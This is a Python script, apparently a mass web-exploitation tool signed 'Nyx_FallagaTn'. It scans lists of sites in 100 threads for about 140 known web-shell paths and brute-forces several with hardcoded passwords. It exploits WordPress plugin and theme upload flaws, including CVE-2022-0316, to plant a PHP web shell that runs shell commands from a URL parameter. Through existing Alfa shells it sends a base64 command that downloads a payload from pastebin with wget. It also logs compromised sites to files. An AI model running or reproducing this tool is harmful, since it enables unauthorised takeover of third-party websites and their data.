import requests
import console
from concurrent.futures import ThreadPoolExecutor
import os , sys , time , random , string
from urllib.parse import unquote
from re import findall as reg
import base64

requests.packages.urllib3.disable_warnings()

fg = '\033[92m'
fr = '\033[91m'
fw = '\033[97m'
fy = '\033[93m'
fb = '\033[94m'
flc = '\033[96m'
bd = '\u001b[1m'
res = '\u001b[0m'

VALID = 0
BAD = 0
CHECKED = 0
TOTAL = 0

nyx_dev = False

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}

headersx = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}

up = """<title>404 Not Found</title><center><br><br><?php 
error_reporting(E_ERROR | E_PARSE);
echo "<b>Nyx_FallagaTn</b><br>";
echo '<b>System Info:</b> '.php_uname();
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
echo '';
system($_GET['cmd']);
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
echo '<b>Success!</b><br><br>'; 
}else { echo 'Failed!</b><br><br>'; }}
?>"""

NYX = [
        {'name':"OTHER_EXPLOITS_NYX"},
        {'name':'14.php','keywords':{'29735209'}},
        {'name':'1.php','keywords':{'drwxr-xr-x'}},
        {'name':'x.php','keywords':{'drwxr-xr-x'}},
        {'name':'c.php','keywords':{'drwxr-xr-x'}},
        {'name':'a.php','keywords':{'drwxr-xr-x'}},
        {'name':'up.php','keywords':{'drwxr-xr-x'}},
        {'name':'fw.php','keywords':{'Owner/Group'}},
        {'name':'ws.php','keywords':{'Owner/Group'}},
        {'name':'404.php','keywords':{'drwxr-xr-x'}},
        {'name':'403.php','keywords':{'drwxr-xr-x'}},
        {'name':'406.php','keywords':{'drwxr-xr-x'}},
        {'name':'css.php','keywords':{'drwxr-xr-x'}},
        {'name':'data.php','keywords':{'drwxr-xr-x'}},
        {'name':'mini.php','keywords':{'drwxr-xr-x'}},
        {'name':'wso.php','keywords':{'Owner/Group'}},
        {'name':'small.php','keywords':{'drwxr-xr-x'}},
        {'name':'edit.php','keywords':{'Green Shell'}},
        {'name':'bala.php','keywords':{'Owner/Group'}},
        {'name':'about.php','keywords':{'drwxr-xr-x'}},
        {'name':'shell.php','keywords':{'drwxr-xr-x'}},
        {'name':'radio.php','keywords':{'Owner/Group'}},
        {'name':'3index.php','keywords':{'drwxr-xr-x'}},
        {'name':'xl2023.php','keywords':{'drwxr-xr-x'}},
        {'name':'4index.php','keywords':{'drwxr-xr-x'}},
        {'name':'5index.php','keywords':{'drwxr-xr-x'}},
        {'name':'6index.php','keywords':{'drwxr-xr-x'}},
        {'name':'lock360.php','keywords':{'drwxr-xr-x'}},
        {'name':'locales.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-info.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-blog.php','keywords':{'drwxr-xr-x'}},
        {'name':'gank.php.PhP','keywords':{'drwxr-xr-x'}},
        {'name':'wp-class.php','keywords':{'drwxr-xr-x'}},
        {'name':'edit-form.php','keywords':{'drwxr-xr-x'}},
        {'name':'old-index.php','keywords':{'drwxr-xr-x'}},
        {'name':'new-index.php','keywords':{'drwxr-xr-x'}},
        {'name':'.wp-back.phP','keywords':{'Owner/Group'}},
        {'name':'xltavrat.php','keywords':{'Owner/Group'}},
        {'name':'.Wp-back.phP','keywords':{'Owner/Group'}},
        {'name':'wsoyanzorng.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-admin/fw.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-admin/wso.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-admin/406.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-content/fw.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-admin/alfa.php','keywords':{'drwxr-xr-x'}},
        {'name':'ups.php','keywords':{'Vuln!! patch it Now!'}},
        {'name':'ccx/index.php','keywords':{'Negat1ve Shell'}},
        {'name':'mt/pekok.php','keywords':{'Kirigaya Kirito'}},
        {'name':'wikindex.php','keywords':{'title>Mini Shell'}},
        {'name':'wp-content/406.php','keywords':{'drwxr-xr-x'}},
        {'name':'webadmin/about.php','keywords':{'drwxr-xr-x'}},
        {'name':'leaf.php','keywords':{'title>Leaf PHPMailer'}},
        {'name':'upload.php?mr=exe3','keywords':{'drwxr-xr-x'}},
        {'name':'wp-content/wso.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-includes/wso.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-admin/xl2023.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-admin/images.php','keywords':{'drwxr-xr-x'}},
        {'name':'safeofxy/izo2023.php','keywords':{'Shell Code'}},
        {'name':'wp-includes/atom.php','keywords':{'drwxr-xr-x'}},
        {'name':'mailer.php','keywords':{'title>Leaf PHPMailer'}},
        {'name':'wp-content/xl2023.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-includes/xl2023.php','keywords':{'drwxr-xr-x'}},
        {'name':'autoload_classmap.php','keywords':{'Owner/Group'}},
        {'name':'wp-admin/wso112233.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp.php?Chitoge','keywords':{'Chitoge kirisaki <3'}},
        {'name':'leafmailer.php','keywords':{'title>Leaf PHPMailer'}},
        {'name':'wp-content/wso112233.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-includes/wp-class.php','keywords':{'Owner/Group'}},
        {'name':'wp-includes/wso112233.php','keywords':{'drwxr-xr-x'}},
        {'name':'leafmailer2.8.php','keywords':{'title>Leaf PHPMailer'}},
        {'name':'wso1122333.php','keywords':{'<span>Upload file:</span>'}},
        {'name':'.well-known/leaf.php','keywords':{'title>Leaf PHPMailer'}},
        {'name':'wp-content/plugins/TOPXOH/wDR.php','keywords':{'FilesMan'}},
        {'name':'shell20211028.php','keywords':{'<span>Upload file:</span>'}},
        {'name':'wp-content/themes/sketch/404.php','keywords':{'drwxr-xr-x'}},
        {'name':'doc.php','keywords':{'Upload File','Current Path','Your IP'}},
        {'name':'wp-content/plugins/sid/sidwso.php','keywords':{'Owner/Group'}},
        {'name':'index.php?3x=3x','keywords':{'<title>Upload files...</title>'}},
        {'name':'.well-known/acme-challenge/Alfa.php','keywords':{'drwxr-xr-x'}},
        {'name':'sym403.php','keywords':{'title>Symlink Get Config 403','_upl'}},
        {'name':'.well-known/pki-validation/alfa.php','keywords':{'./AlfaTeam'}},
        {'name':'wp-content/themes/ccx/index.php','keywords':{'Negat1ve Shell'}},
        {'name':'wp-content/plugins/ccx/index.php','keywords':{'Negat1ve Shell'}},
        {'name':'wp-admin/js/widgets/wp-contact.php','keywords':{'FierzaXploit'}},
        {'name':'wp-content/wp-conf.php?1=system','keywords':{'root:x:0:0:root'}},
        {'name':'wp-content/themes/mero-magazine/ws.php','keywords':{'drwxr-xr-x'}},
        {'name':'.well-known/acme-challenge/atomlib.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-content/plugins/core-stab/index.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-content/themes/seotheme/db.php?u','keywords':{'#0x2525',"_upl"}},
        {'name':'wp-content/themes/classic/inc/index.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-content/themes/twentyfive/include.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-content/uploads/ac_assets/IndoSec.php','keywords':{'{ INDOSEC }'}},
        {'name':'wp-admin/shell20211028.php','keywords':{'<span>Upload file:</span>'}},
        {'name':'wp-content/plugins/seoplugins/db.php?u','keywords':{'#0x2525',"_upl"}},
        {'name':'wp-content/shell20211028.php','keywords':{'<span>Upload file:</span>'}},
        {'name':'wp-content/themes/seotheme/mar.php','keywords':{'#0x2525',"marijuana"}},
        {'name':'wp-includes/shell20211028.php','keywords':{'<span>Upload file:</span>'}},
        {'name':'wp-includes/widgets/class-wp-widget-index.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-includes/ID3/vp.php','keywords':{'input type="submit" value="Upload"'}},
        {'name':'wp-includes/embed-wp.php','keywords':{'input type="submit" value="LOAD"'}},
        {'name':'beence.php','keywords':{'method=post>Password','type=password name=pass'}},
        {'name':'wp-content/plugins/seoplugins/mar.php','keywords':{'#0x2525',"marijuana"}},
        {'name':'wp-admin/css/colors/midnight/wp-crons.php','keywords':{'title>GR0V Shell'}},
        {'name':'style.php','keywords':{'enctype="multipart/form-data"><input type="file"'}},
        {'name':'xleet.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
        {'name':'lufix.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
        {'name':'wp-content/xxx/xxx-xxx/xxxx-xx-xx/pages/xxxxxx.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-content/updates.php','keywords':{'<input type="password" name="password">'}},
        {'name':'wp-content/plugins/wp-file-upload/ROOBOTS.php','keywords':{'Upl0od Your T0ols'}},
        {'name':'wp-content/plugins/press/wp-class.php','keywords':{'<span>Upload file:</span>'}},
        {'name':'wp-content/themes/mero-magazine/ws.php','keywords':{'<span>Upload file:</span>'}},
        {'name':'wp-content/index.php','keywords':{"enctype='multipart/form-data'","type='file'"}},
        {'name':'wp-content/plugins/w0rdpr3ssnew/about.php','keywords':{'Faizzz-Chin ShellXploit'}},
        {'name':'wp-confiig.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
        {'name':'xleet-shell.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
        {'name':'wp-commentin.php?pass=f0aab4595a024d626315fb786dce8282','keywords':{"Owner/Group"}},
        {'name':'wp-content/uploads/wp-logout.php','keywords':{'input type="submit" value="upload"'}},
        {'name':'wp-conflg.php','keywords':{'Current Path','Upload File','Ghazascanner File Manager'}},
        {'name':'wp-admin/includes/logs.php','keywords':{'input name=" Exploit Donefile" type="file"'}},
        {'name':'wp-content/plugins/w0rdpr3ssnew/wp-login.php','keywords':{'Public Shell Version 2.0'}},
        {'name':'wp_wrong_datlib.php','keywords':{'method=post>Password',"type=submit name='watching'"}},
        {'name':'wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php','keywords':{'drwxr-xr-x'}},
        {'name':'wp-includes/pomo/treame.php','keywords':{'input class="Input" type="file" name="file_n[]"'}},
        {'name':'1index.php','keywords':{'method=post>Password',"type=password name=pass><input type=submit"}},
        {'name':'2index.php','keywords':{'method=post>Password',"type=password name=pass><input type=submit"}},
        {'name':'database.php','keywords':{'DeathShop Uploader',"enctype='multipart/form-data'","type='file'"}},
        {'name':'wp-includes/pomo/newup.php','keywords':{'input name="_upl" type="submit" id="_upl" value="Upload"'}},
        {'name':'wp-content/themes/pridmag/db.php?u','keywords':{'enctype="multipart/form-data"','type="file"','_upl'}},
        {'name':'wp-content/plugins/anttt/simple.php','keywords':{'input type="file" id="inputfile" name="inputfile"'}},
        {'name':'wp-content/plugins/instabuilder2/cache/plugins/moon.php','keywords':{'<title>Gel4y Mini Shell</title>'}},
        {'name':'wp-content/plugins/linkpreview/db.php?u','keywords':{'enctype="multipart/form-data"','type="file"','_upl'}},
        {'name':'wp-content/plugins/instabuilder2/cache/up.php','keywords':{"input type='submit' name='upload' value='upload'"}},
        {'name':'wp-content/plugins/xwp/up.php','keywords':{'input type="file" name="a"><input name="x" type="submit" value="x"'}},
        {'name':'wp-content/plugins/wordpresss3cll/up.php','keywords':{'enctype="multipart/form-data"><input type="file" name="btul"><button>Gaskan<'}},
        {'name':'wp-admin/x.php?action=768776e296b6f286f26796e2a72607e2972647','keywords':{'UPload PHP',"enctype='multipart/form-data'","type='file'"}},
        {'name':'wp-content/plugins/ioptimization/IOptimize.php?rchk','keywords':{'input name="userfile" type="file"><input type="submit" value="Upload"'}},
        {'name':'wp-content/plugins/wpyii2/wpyii2.php','keywords':{"<form class='gegel2' method=post><input type=password name=pw><input type=submit value='>>'></form>"}},
        {'name':'modules/mod_simplefileuploadv1.3/elements/i8HQoK6nR.php?action=768776e296b6f286f26796e2a72607e2972647','keywords':{"type='file'","enctype='multipart/form-data'"}},
        {'name':'joomla/modules/mod_simplefileuploadv1.3/elements/i8HQoK6nR.php?action=768776e296b6f286f26796e2a72607e2972647','keywords':{"type='file'","enctype='multipart/form-data'"}}
]

def title_update(checked,total,valid,bad):
    os.system("title " + "[+] EXPLOIT FINDER [{}/{}] - SHELLS : {} - BAD : {}".format(checked,total,valid,bad))

def oni():
    msg = """{}     ⣰⡆                      ⠐⣆           \    ⣴⠁⡇    {}@Nyx_FallagaTn{}    ⢀⠃⢣           \    ⢻ ⠸⡀                     ⡜ ⢸⠇           \    ⠘⡄⢆⠑⡄     ⢀⣀⣀⣠⣄⣀⣀⡀     ⢀⠜⢠⢀⡆           \     ⠘⣜⣦⠈⢢⡀⣀⣴⣾⣿⡛⠛⠛⠛⠛⠛⡿⣿⣦⣄ ⡠⠋⣰⢧⠎           \      ⠘⣿⣧⢀⠉⢻⡟⠁⠙⠃    ⠈⠋ ⠹⡟⠉⢠⢰⣿⠏           \       ⠘⣿⡎⢆⣸⡄          ⠠⣿⣠⢣⣿⠏           \       ⡖⠻⣿⠼⢽            ⢹⠹⣾⠟⢳⡄           \       ⡟⡇⢨ ⢸⡀           ⡎ ⣇⢠⢿⠇           \       ⢹⠃⢻⡤⠚    {}⣀  ⢀{}    ⠙⠢⡼ ⢻           \       ⠸⡓⡄{}⢹⠦⠤⠤⠤⢾⣇  ⢠⡷⠦⠤⠤⠴⢺{}⢁⠔⡟           \       ⢠⠁⣷{}⠈⠓⠤⠤⠤⣞⡻  ⢸⣱⣤⠤⠤⠔⠁{}⣸⡆⣇           \       ⠘⢲⠋⢦⣀⣠⢴⠶ {}⠁  ⠈⠁{}⠴⣶⣄⣀⡴⠋⣷⠋           \        ⣿⡀  ⢀⡘⠶⣄⡀   ⣠⡴⠞⣶ ⢀ ⣼           \        ⠈⠻⣌⢢⢸⣷⣸⡈⠳⠦⠤⠞⠁⣷⣼⡏⣰⢃⡾⠋           \          ⠙⢿⣿⣿⡇⢻⡶⣦⣤⡴⡾⢸⣿⣿⣷⠏           \            ⢿⡟⡿⡄⣳⣤⣤⣴⢁⣾⠏⡿⠁           \            ⠈⣷⠘⠒⠚⠉⠉⠑⠒⠊⣸⠇           \             ⠈⠳⠶⠔⠒⠒⠲⠴⠞⠋{}           \ """.format(fg,fr,fg,fr,fg,fr,fg,fr,fg,fr,fg,fw)
    line = ''
    lines = []
    for i in msg:
        if str(i) == '\\':
            lines.append(line)
            line = ''
        else:
            line += str(i)
    maxlen = 0
    for line in lines:
        if int(len(line)) > maxlen:
            maxlen = int(len(line))
    for line in lines:
        while int(len(line)) < maxlen:
            line += ' '
        print(str(line).center(os.get_terminal_size().columns , " "))
        time.sleep(0.12)

def URLdomain(url):
    if 'http://' in str(url).lower() or 'https://' in str(url).lower():
        url = str(url).lower().replace('https://','http://')
    else:
        url = 'http://' + str(url).lower()
    return url

def wp_22(url):
    NYX_SN = "nyx-%s.php" % str( ''.join(random.choice( string.ascii_lowercase ) for i in range(5) ) )
    paths = [
        '/wp-22.php?sfilename={}&sfilecontent={}&supfiles={}'.format(NYX_SN,up,NYX_SN),
        '/wp-includes/wp-22.php?sfilename={}&sfilecontent={}&supfiles={}'.format(NYX_SN,up,NYX_SN),
        '/wp-content/wp-22.php?sfilename={}&sfilecontent={}&supfiles={}'.format(NYX_SN,up,NYX_SN),
        '/wp-admin/wp-22.php?sfilename={}&sfilecontent={}&supfiles={}'.format(NYX_SN,up,NYX_SN)
    ]
    for path in paths:
        urlx = str(url) + str(path)
        urlxx = str(url) + str(path).split('?')[0]
        req = requests.get(urlx , headers = headers , timeout = 12).text
        if '{}success'.format(NYX_SN) in str(req):
            urlx = str(url) + '/{}'.format(NYX_SN)
            chk = requests.get(urlx , headers = headers , timeout = 10).text
            if 'Nyx_FallagaTn' in str(chk):
                open('wp-22-Exploit.txt','a',errors='ignore').write( urlx + '\n')
                return True
    return False

def RCE(url):
    nameshell = "nyx-%s.php" % str( ''.join(random.choice( string.ascii_lowercase ) for i in range(5) ) )
    paths = [ "/wp-content/plugins/t_file_wp/t_file_wp.php" , "/wp-content/plugins/apikey/apikey.php"]
    for path in paths:
        urlx = str(url) + str(path)
        files = {'filename':(nameshell,up)}
        header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
                    "Connection": "close"
                    }
        requests.post( urlx , headers=header  , files=files , verify=False , timeout=10 )
        header = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0",
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "close",
                    "Upgrade-Insecure-Requests": "1"
                    }
        shell = str(urlx).replace(str(urlx).split("/").pop(-1),nameshell)
        chk_shell = requests.get( shell , headers=header  , verify=False , timeout=10 ).text
        if 'Nyx_FallagaTn' in str(chk_shell):
            open('RCE-Exploit.txt','a',errors='ignore').write( shell + '\n')
            return True
    return False

def autoupload_liax(url , headersliax):
    up = """
<title>404 Not Found</title><div><img style="display: block; margin-left: auto; margin-right: auto;" src="https://cdn.pixabay.com/photo/2021/02/25/14/12/rinnegan-6049194_960_720.png" width="250" /></div>
<center><br><br><?php 
error_reporting(E_ERROR | E_PARSE);
echo "<b>Nyx_FallagaTn & Utchiha505</b><br>";
echo '<b>System Info:</b> '.php_uname();
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
echo '';
system($_GET['cmd']);
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
echo '<b>Success!</b><br><br>'; 
}else { echo 'Failed!</b><br><br>'; }}
?>"""
    nameshell = "%s.php" % str( ''.join(random.choice( string.ascii_lowercase ) for i in range(10) ) )
    upload = {
        'p': '',
        'upl': '1'
    }
    files = {'upload[]':(nameshell,up)}
    requests.post(url + "?p=&upload" , headers = headersliax , data = upload , files = files)
    shell = str(url).replace(str(url).split("/").pop(-1),nameshell)
    chk_shell = requests.get(shell , headers = headers ).text
    if 'Nyx_FallagaTn & Utchiha505' in str(chk_shell):
        return True , shell
    else:
        return False , ''

def LIAX(url):
    ses = requests.Session()
    urlx = str(url) + '/moduless.php'
    req = ses.get(urlx , headers =headers , verify = False)
    if 'id="li*ax"' in str(req.text) and 'fm_pwd' in str(req.text) and 'fm_usr' in str(req.text):
        urlx = str(req.url)
        cookies = reg('filemanager=(.*?) ',str(req.cookies))[0]
        cookies = 'filemanager={}'.format(cookies)
        headersliax = {
            'cookie': '{}'.format(str(cookies)),
            'origin': '{}'.format(str(url)),
            'referer': '{}'.format(str(urlx)),
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
        }
        data = {
            'fm_usr': 'Xs3jhXQ3NG',
            'fm_pwd': 'Xs3jhXQ3NG'
        }
        req = ses.post(urlx , headers = headersliax, data = data ).text
        req = ses.get(urlx , headers = headersliax).text
        if 'title>li*ax' in str(req):
            chk = autoupload_liax(urlx , headersliax)
            if chk[0]:
                open('LIAX-Exploit.txt','a',errors='ignore').write( chk[1] + '\n')
                return True
    return False

def CVE_2022_0316(url):
    paths= ["westand","footysquare","aidreform","statfort","club-theme","kingclub-theme","spikes","spikes-black","soundblast","bolster","rocky-theme","bolster-theme","theme-deejay","snapture","onelife","churchlife","soccer-theme","faith-theme","statfort-new"]
    session = requests.Session()
    session.verify  = False
    session.timeout = (20,40)
    session.allow_redirects = True
    session.max_redirects = 5
    session.headers.update({"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"})
    for path in paths:
        url = "{}/wp-content/themes/{}/include/lang_upload.php".format(url,path)
        req = session.get(url).text
        if 'Please select Mo file' in req:
            nameshell = "nyx-%s.php" % str( ''.join(random.choice( string.ascii_lowercase ) for i in range(5) ) )
            upload = session.post(url, files={"mofile[]": (nameshell, up)}).text
            if "New Language Uploaded Successfully" in upload:
                shell = str(url).replace(str(url).split("/").pop(-1),nameshell)
                check_uploaded = session.get(shell).text
                if 'Nyx_FallagaTn' in str(check_uploaded):
                    open('CVE_2022_0316-Exploit.txt','a',errors='ignore').write( shell + '\n')
                    return True
    return False

def alfa(url) :
    paths = ['alfacgiapi/perl.alfa','ALFA_DATA/alfacgiapi/perl.alfa']
    for path in paths:
        shell = str(url) + '/{}'.format(path)
        nameshell = "nyx-%s.php" % str( ''.join(random.choice( string.ascii_lowercase ) for i in range(5) ) )
        payload = {'cmd':base64.b64encode(f'echo "INFECTED_2121224564215" && wget https://pastebin.com/raw/py74iips -O {nameshell}'.encode())}
        req = requests.post(shell, data=payload, timeout=10).text
        if 'INFECTED_2121224564215' in req :
            shell = shell.replace('perl.alfa',nameshell)
            check_shell = requests.get(shell,headers=headers, timeout=10).text
            if 'Nyx_FallagaTn' in check_shell :
                open('Alfa-Exploit.txt','a',errors='ignore').write(shell + '\n')
                return True
    return False

def p3dlite(url):
    nameshell = "nyx-%s.php" % str( ''.join(random.choice( string.ascii_lowercase ) for i in range(5) ) )
    myup = {'file': (nameshell, up)}
    req = requests.post(url + '/wp-admin/admin-ajax.php?action=p3dlite_handle_upload', files=myup, headers=headers,verify=False, timeout=10).text
    if 'jsonrpc' in req:
        shell = url + '/wp-content/uploads/mfw-activity-logger/csv-uploads/{}'.format(nameshell)
        check_shell = requests.get(shell).text
        if 'Nyx_FallagaTn' in check_shell:
            open('p3dlite-Exploit.txt','a',errors='ignore').write(shell + '\n')
            return True
    return False

def check(url_testes):
    global VALID , BAD , CHECKED
    found_shell = 0
    url = URLdomain(url_testes)
    for type in NYX:
        name = str(type['name'])
        if name != 'OTHER_EXPLOITS_NYX':
            keywords = type['keywords']
            if str(name)[0] != '/':
                name = '/' + str(name)
            urlx = str(url) + str(name)
            try:
                req = requests.get(urlx , headers = headers , timeout = 12).text
                if 'forbidden' in str(req).lower() or 'title>404' in str(req).lower() or 'title>not acceptable' in str(req).lower():
                    req = requests.get(urlx, headers = headersx , timeout = 12).text
                    if 'forbidden' in str(req).lower() or 'title>404' in str(req).lower() or 'title>not acceptable' in str(req).lower():
                        urlx = str(urlx).replace('http://','https://')
                        req = requests.get(urlx , headers = headers , timeout = 12).text
                        if 'forbidden' in str(req).lower() or 'title>404' in str(req).lower() or 'title>not acceptable' in str(req).lower():
                            req = requests.get(urlx , headers = headersx , timeout = 12).text
                            if 'forbidden' in str(req).lower() or 'title>404' in str(req).lower() or 'title>not acceptable' in str(req).lower():
                                req = ''
            except:
                pass
            if req != '':
                count = 0
                for i in keywords:
                    if str(i).lower() in str(req).lower():
                        count += 1
                if int(count) == int(len(keywords)):
                    if 'xleet' in str(name):
                        ses = requests.Session()
                        data = {'pass': 'xleet','watching': 'submit'}
                        ses.post(urlx , headers = headersx , data = data)
                        req_pass = ses.get(urlx , headers = headersx).text
                        if 'method=post>Password' not in str(req_pass):
                            urlx = '{}?pass=xleet'.format(urlx)
                    elif 'wp-confiig.php' in str(name) or 'lufix.php' in str(name):
                        ses = requests.Session()
                        data = {'pass': 'lufix','watching': 'submit'}
                        ses.post(urlx , headers = headersx , data = data)
                        req_pass = ses.get(urlx , headers = headersx).text
                        if 'method=post>Password' not in str(req_pass):
                            urlx = '{}?pass=lufix'.format(urlx)
                    elif 'wp_wrong_datlib.php' in str(name):
                        ses = requests.Session()
                        data = {'pass': 'stusa','watching': 'submit'}
                        ses.post(urlx , headers = headersx , data = data)
                        req_pass = ses.get(urlx , headers = headersx).text
                        if 'method=post>Password' not in str(req_pass):
                            urlx = '{}?pass=stusa'.format(urlx)
                    elif '2index.php' in str(name):
                        ses = requests.Session()
                        data = {'pass': 'am*guAW8.ryDgz-TYF'}
                        ses.post(urlx , headers = headersx , data = data)
                        req_pass = ses.get(urlx , headers = headersx).text
                        if 'method=post>Password' not in str(req_pass):
                            urlx = '{}?pass=am*guAW8.ryDgz-TYF'.format(urlx)
                    elif 'beence.php' in str(name):
                        ses = requests.Session()
                        data = {'pass': '3a89149a9d5ae80acf6ee5d70a2d3229'}
                        ses.post(urlx , headers = headersx , data = data)
                        req_pass = ses.get(urlx , headers = headersx).text
                        if 'method=post>Password' not in str(req_pass):
                            urlx = '{}?pass=3a89149a9d5ae80acf6ee5d70a2d3229'.format(urlx)
                    elif 'wp-content/updates.php' in str(name):
                        ses = requests.Session()
                        data = {'password': 'cfwk',
                                'submit': '  >>'}
                        ses.post(urlx , headers=headersx , data = data)
                        req_pass = ses.get(urlx , headers = headersx).text
                        if '<input type="password" name="password">' not in str(req_pass):
                            urlx = '{}?password=cfwk'.format(urlx)
                    open('vuln.txt','a',errors='ignore').write(urlx + '\n')
                    found_shell += 1
                    break
        else:
            if LIAX(url):
                found_shell += 1
                break
            if wp_22(url):
                found_shell += 1
                break
            if RCE(url):
                found_shell += 1
                break
            if CVE_2022_0316(url):
                found_shell += 1
                break
            if alfa(url):
                found_shell += 1
                break
            if p3dlite(url):
                found_shell += 1
                break
    if found_shell != 0:
        print('{}[ {}+{} ] {} [ {}VULN{} ]'.format(fw,fg,fw,url_testes,fg,fw))
        VALID += 1
    else:
        print('{}[ {}-{} ] {} [ {}FAIL{} ]'.format(fw,fr,fw,url_testes,fr,fw))
        BAD += 1
    CHECKED += 1
    title_update(CHECKED,TOTAL,VALID,BAD)

def main():
    try:
        ThreadPoolExecutor(100).map(check ,lista)
    except:
        pass

if not nyx_dev:
    try:
        lista = list(x.strip() for x in open(sys.argv[1],'r',errors='ignore').readlines())
    except IndexError:
        path = str(sys.argv[0]).split('\\')
        exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
    TOTAL = int(len(lista))
    oni()
    print('\n')
    print('{}[{}INFO{}] Loaded {}{}{} domains!'.format(fw,fg,fw,fr,TOTAL,fw))
    print('\n')
    main()
else:
    check('em-shidiq.com')
